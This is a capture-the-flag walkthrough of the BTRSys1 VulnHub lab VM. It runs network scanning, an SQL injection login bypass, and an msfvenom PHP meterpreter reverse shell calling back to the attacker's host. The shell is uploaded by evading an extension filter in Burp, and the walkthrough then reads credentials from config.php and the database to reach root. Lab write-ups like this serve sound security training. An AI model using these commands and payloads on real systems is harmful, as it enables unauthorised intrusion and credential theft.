<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the BTRSys1 VM (Boot2Root Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-btrsys1-vm-boot2root-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-10-21T16:08:25+00:00">October 21, 2017</time><time class="updated" datetime="2025-06-10T20:35:58+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">BTRSys v1 is another lab by ‘ismailonderkaya’ in the series BTRSys. This lab helps you sharpen your skills as a pentester. It is a must lab for a beginner.</span></p>
<p><span style="color: #000000;"><strong>Difficulty leve</strong>l: Beginner</span></p>
<h3><span style="color: #800000;"><strong>WalkThrough</strong></span></h3>
<p><span style="color: #000000;">Let’s start with finding our target as always by using the following command:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UM6Oe9m0xg0/WetqFiYo0PI/AAAAAAAASFE/EPGnyFx1aUMx5aa-nQCzGnifbaYw190pwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now as we know our target is 192.168.0.105. Let’s use nmap on it. We all know nmap has many types of scans but aggression scan is much better as it combines and gives all the information at once.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.0.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Zll2jNccQHU/WetqHrxim7I/AAAAAAAASFo/LA2EjvZKfWQ_kD2_MDSqn7JiP_cYiCsCgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Through nmap, we know that <strong>port 21, 22 and 80 </strong>are open with the services of <strong>FTP, SSH, and HTTP</strong> respectively. As nmap hasn’t told us much; we shall dig deeper by using <strong>Nikto. </strong>Nikto is an open-source web server scanner which allows you look for vulnerable files/programs, outdated versions, index files, http server options, etc. to use Nikto type :</span></p>
<pre class="lang:default decode:true">nikto -h http://192.168.0.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Pxb-87uAgpg/WetqHzc7vyI/AAAAAAAASFw/NAoeakV07tIsnH_-HijERQrOnVxYFHV7wCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">With the help of Nikto, we know that there is login page à<strong> /login.php</strong></span></p>
<p><span style="color: #000000;">Let’s go the login page by typing the following in URL:</span></p>
<pre class="lang:default decode:true">192.168.0.105/login.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vGd5o5Vb5lA/WetqIDHo-CI/AAAAAAAASF0/_Q6dUGsCxykK_pt2ne4Cpyc9gV-J67U4wCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So now we in on login page but we do not have credentials to log in. Let’s check its page source.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c1m-ce0zf4Q/WetqIjuAuGI/AAAAAAAASF4/7c6Pt7WYSvQohnFC2hDJ6mAhAIFEuV9rQCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now in the page source if you observe the function control carefully, you’ll realize that username ends with <strong>@btrisk.com</strong> so, therefore we can use SQL injection here and for that use the following steps:</span></p>
<p><span style="color: #000000;">Use brute force to apply SQL injection. (When asked for text file for brute-force, select the one with the list of all SQL injection commands)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aL8Jp8cw6NE/WetqIoj0AjI/AAAAAAAASF8/DuB-_yBTHUoEQ-PyJIxrCOYruGuN87wOgCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">After the completion of brute force, it will give the correct SQL code which will help you log in as shown in the above image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-pDAgFngrNdk/WetqI45r6YI/AAAAAAAASGA/sIeKK2CUQsc9-g_H2Zj3twyoqCWzIt55QCLcBGAs/s1600/7.1.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">Right click on that code and select <strong>‘Show response in browser’</strong> as shown above. This will open the browser and you will find yourself automatically logged in.</span></p>
<p><span style="color: #000000;">Login Details: <strong>@btrisk.com   ‘ or “=’</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UyQIcShyGwM/WetqJJqOyrI/AAAAAAAASGE/7XrGIkoaq1o7mr04v8-q-NjJp3TRFgu0gCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">As we are logged in, there is an option to upload a file. Here, we can upload our malicious PHP code. To generate the code go to the terminal of kali and type:</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SXf10J_FnAA/WetqJSC1caI/AAAAAAAASGI/Rlg4k4cmOBUeYfQ3Fd4R1wULyp_9cUWuACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Copy the code from <strong>&lt;?php</strong> to <strong>die(); </strong>and save it in .txt file. After saving change the extension from .txt to .php and then upload it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--xLkyDF8Mfk/WetqJb7l49I/AAAAAAAASGM/NjbrQrroKSE3nf5JJ6Bx39JvDYjvNwY2wCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">When you try to upload your .php file it will show that only jpg and png files can be uploaded. Okay! So now change the extension from .php to .jpg and then upload it but when you upload it remember to capture the request in burp suite.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BeWy3IC-03A/WetqFtvzcjI/AAAAAAAASFI/ksOxALg6zosX3lsJ9CDqM8X_1xiC5IMcgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Once the request is captured in BurpSuite, change the file extension from .jpg back to .php and forward the request. This way your malicious .php code will be uploaded on the web application.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HRTvxhS9nds/WetqF00ODuI/AAAAAAAASFM/HZjEimlr5ZclHilaaioTNm8JD-pe9D4xwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Our malicious file I s uploaded but we yet have to find the directory where it was uploaded so we can execute it and have our session. Therefore, next, we will use DIRB. And for that type:</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1ZgfnF-u5sw/WetqGZIb_gI/AAAAAAAASFU/QQYJGpGTSm4GWVNz-LlpvHDTxWkMaY57wCLcBGAs/s1600/12.1.png"/></span></p>
<p><span style="color: #000000;">Dirb has shown us that there is a directory named uploads so obviously there our file has been uploaded. To execute the file type the following in the URL:</span></p>
<pre class="lang:default decode:true">192.168.0.105/uploadsd/shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-I7F5_vfjLlo/WetqGcMLCBI/AAAAAAAASFQ/e27QmafyJx8Fa4rNvvVzTHVJCTccypLbwCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Like always before executing the file remember to activate your handler on Metasploit so that you can have your session. And for this open Metasploit and type:</span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.0.107
set lport 4444
exploit</pre>
<p><span style="color: #000000;">After the handler is activated and your file is executed; you will have your meterpreter session. Let’s then further check system information and for that type:</span></p>
<pre class="lang:default decode:true">sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-iP2kbVoLgXY/WetqGsNvtWI/AAAAAAAASFY/nMw_tQ-xxqwOwSxs1eeHDj0ACHm9Bx0MwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now that we have meterpreter session let’s explore a bit and look into HTML files:</span></p>
<pre class="lang:default decode:true">cd /var/www/html
ls</pre>
<p><span style="color: #000000;">There is a <strong>config.php</strong> file in var/www/html. This file has often proven to be important so let’s check it out.</span></p>
<pre class="lang:default decode:true">cat config.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZrNeuxu0yCo/WetqHN6IRtI/AAAAAAAASFk/imxKEV0qY7cKZR44kX0GRo441FYrfVV3wCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Through config.php we know that one of the following words is a username and password :</span></p>
<pre class="lang:default decode:true">root
toor
deneme</pre>
<p><span style="color: #000000;">Let’s now go to shell and try to log in through these three keywords :</span></p>
<pre class="lang:default decode:true">shell
mysql -uroot -p -Ddeneme</pre>
<p><span style="color: #000000;">And then enter password <strong>toor</strong></span></p>
<p><span style="color: #000000;">Once logged in let’s look for tables by using the following command :</span></p>
<pre class="lang:default decode:true">show tables;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XJsNRDwoWkU/WetqHPdiUnI/AAAAAAAASFc/TPOGqlWNLGAJTlKiWJM2Ejet5PGuGCx6ACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">As shown in the above image there is a table named <strong>user. </strong>Let’s see what this table has :</span></p>
<pre class="lang:default decode:true">select * from user;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nwLnxkVHSxs/WetqHB75skI/AAAAAAAASFg/lZ4mtT9xFogAA1y6Gj49AzWQc_t4jeuWwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">From the table, we now know that the password for root is <strong>asd123***</strong>. Let’s login from it :</span></p>
<pre class="lang:default decode:true">su root
asd123***</pre>
<p><span style="color: #000000;">Let’s confirm our root access :</span></p>
<pre class="lang:default decode:true">whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-VbcbgxL9fZQ/WetqH9toB5I/AAAAAAAASFs/oKKiZ_7dvMwPGSyLfP_64cnLgFFJHiQ3QCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
